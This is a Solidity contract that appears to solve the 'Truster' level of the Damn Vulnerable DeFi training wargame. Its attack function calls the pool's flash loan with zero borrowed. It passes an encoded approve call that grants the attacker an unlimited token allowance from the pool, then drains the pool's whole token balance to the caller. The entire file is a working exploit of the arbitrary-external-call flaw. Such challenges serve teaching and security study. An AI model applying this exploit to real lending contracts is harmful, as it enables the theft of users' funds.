// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";

contract AttackTruster {
    DamnValuableToken token;
    TrusterLenderPool truster;

    constructor(address token_, address truster_) {
        token = DamnValuableToken(token_);
        truster = TrusterLenderPool(truster_);
    }

    function attack() public {
        truster.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        token.transferFrom(address(truster), address(msg.sender), token.balanceOf(address(truster)));
    }
}
